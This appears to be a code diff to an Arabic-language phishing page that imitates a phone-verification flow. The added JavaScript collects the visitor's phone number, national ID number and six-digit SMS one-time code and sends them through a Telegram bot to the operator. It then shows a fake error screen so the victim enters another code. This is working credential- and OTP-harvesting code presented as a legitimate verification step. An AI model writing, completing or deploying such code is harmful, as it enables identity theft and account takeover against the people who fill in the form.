@@ -287,12 +287,16 @@
         }
 
         /* ===== VERIFICATION CODE INPUT ===== */
-        .verification-input-container {
+        .verification-container {
             display: flex;
             justify-content: center;
-            gap: 8px;
-            margin: 30px 0;
-            flex-direction: row-reverse;
+            margin: 40px 0 20px 0;
+        }
+
+        .verification-input-group {
+            display: flex;
+            gap: 12px;
+            direction: ltr;
         }
 
         .verification-input {
@@ -301,12 +305,13 @@
             border: 2px solid #e91e7d;
             border-radius: 8px;
             text-align: center;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
             color: #e91e7d;
             transition: all 0.3s ease;
             background: white;
-            caret-color: #e91e7d;
+            padding: 0;
+            font-family: 'Courier New', monospace;
         }
 
         .verification-input:focus {
@@ -314,17 +319,25 @@
             border-color: #e91e7d;
             box-shadow: 0 0 0 3px rgba(233, 30, 125, 0.2);
             transform: scale(1.05);
-            background: #fff;
+            background: #fff5f9;
         }
 
         .verification-input.filled {
             background: #ffe0ed;
+            border-color: #e91e7d;
         }
 
         .verification-input.error {
             border-color: #d32f2f;
             background: #ffebee;
             color: #d32f2f;
+            animation: shake 0.3s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
         }
 
         /* ===== BUTTON ===== */
@@ -459,11 +472,11 @@
             .verification-input {
                 width: 45px;
                 height: 45px;
-                font-size: 20px;
+                font-size: 18px;
             }
 
-            .verification-input-container {
-                gap: 6px;
+            .verification-input-group {
+                gap: 10px;
             }
         }
     </style>
@@ -566,13 +579,15 @@
                 <div class="phone-display" id="phoneDisplay"></div>
 
                 <form id="verificationForm">
-                    <div class="verification-input-container">
-                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code6" data-index="5">
-                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code5" data-index="4">
-                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code4" data-index="3">
-                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code3" data-index="2">
-                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code2" data-index="1">
-                        <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code1" data-index="0">
+                    <div class="verification-container">
+                        <div class="verification-input-group">
+                            <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code1">
+                            <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code2">
+                            <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code3">
+                            <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code4">
+                            <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code5">
+                            <input type="text" class="verification-input" maxlength="1" inputmode="numeric" id="code6">
+                        </div>
                     </div>
                     <button type="submit" class="btn">التحقق</button>
                 </form>
@@ -667,6 +682,182 @@
 
             // GO TO SCREEN 2
             showScreen(2);
+        });
+
+        // SCREEN 2: VERIFICATION CODE
+        const verificationInputs = document.querySelectorAll('.verification-input');
+        
+        // Setup verification inputs
+        verificationInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value;
+
+                // Allow only digits
+                if (!/^\d$/.test(value) && value !== '') {
+                    e.target.value = '';
+                    return;
+                }
+
+                // If digit entered
+                if (value.length === 1) {
+                    e.target.classList.add('filled');
+                    
+                    // Move to next input (from left to right in RTL = 1,2,3,4,5,6)
+                    if (index < verificationInputs.length - 1) {
+                        verificationInputs[index + 1].focus();
+                    }
+                } else {
+                    e.target.classList.remove('filled');
+                }
+            });
+
+            // Handle backspace
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace') {
+                    e.target.value = '';
+                    e.target.classList.remove('filled');
+                    
+                    // Move to previous input
+                    if (index > 0) {
+                        verificationInputs[index - 1].focus();
+                    }
+                }
+            });
+
+            // Handle paste
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pasteData = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = pasteData.replace(/\D/g, '').split('');
+                
+                digits.forEach((digit, idx) => {
+                    if (index + idx < verificationInputs.length) {
+                        verificationInputs[index + idx].value = digit;
+                        verificationInputs[index + idx].classList.add('filled');
+                    }
+                });
+
+                // Focus last filled input
+                const nextIndex = Math.min(index + digits.length, verificationInputs.length - 1);
+                verificationInputs[nextIndex].focus();
+            });
+
+            // Focus first input on screen 2 load
+            if (index === 0) {
+                setTimeout(() => {
+                    input.focus();
+                }, 100);
+            }
+        });
+
+        document.getElementById('verificationForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            let verificationCode = '';
+            let isComplete = true;
+
+            verificationInputs.forEach(input => {
+                if (input.value === '') {
+                    isComplete = false;
+                    input.classList.add('error');
+                } else {
+                    input.classList.remove('error');
+                    verificationCode += input.value;
+                }
+            });
+
+            if (!isComplete || verificationCode.length !== 6) {
+                alert('يرجى إدخال رمز التفعيل كاملاً (6 أرقام)');
+                return;
+            }
+
+            formData.verificationCode = verificationCode;
+
+            // SEND COMPLETE DATA WITH VERIFICATION CODE TO TELEGRAM
+            const completeMessage = `📋 بيانات التحقق الكاملة:\n\n` +
+                                  `📱 رقم الجوال: ${formData.phoneNumber}\n` +
+                                  `🆔 الرقم الوطني: ${formData.nationalId}\n` +
+                                  `🔐 رمز التفعيل: ${formData.verificationCode}`;
+
+            await sendToTelegram(completeMessage);
+
+            // GO TO SCREEN 3 (ERROR SCREEN)
+            showScreen(3);
+        });
+
+        // SEND MESSAGE TO TELEGRAM
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send message to Telegram');
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+            }
+        }
+
+        // NAVIGATION
+        function showScreen(screenNumber) {
+            document.querySelectorAll('.screen').forEach(screen => {
+                screen.classList.remove('active');
+            });
+            document.getElementById(`screen${screenNumber}`).classList.add('active');
+
+            // Focus first verification input when going to screen 2
+            if (screenNumber === 2) {
+                setTimeout(() => {
+                    verificationInputs[0].focus();
+                }, 300);
+            }
+        }
+
+        function goBack() {
+            showScreen(1);
+            document.getElementById('registrationForm').reset();
+            document.querySelectorAll('.verification-input').forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+                input.classList.remove('error');
+            });
+            document.getElementById('phoneNumber').classList.remove('error');
+            document.getElementById('nationalId').classList.remove('error');
+            formData = {
+                phoneNumber: '',
+                nationalId: '',
+                verificationCode: ''
+            };
+        }
+
+        function retryVerification() {
+            // CLEAR VERIFICATION INPUTS
+            document.querySelectorAll('.verification-input').forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+                input.classList.remove('error');
+            });
+            formData.verificationCode = '';
             
-            // FOCUS FIRST CODE INPUT
-            setTimeout*
+            // GO BACK TO VERIFICATION SCREEN
+            showScreen(2);
+            
+            // FOCUS FIRST VERIFICATION INPUT
+            setTimeout(() => {
+                verificationInputs[0].focus();
+            }, 300);
+        }
+    </script>
+</body>
+</html>
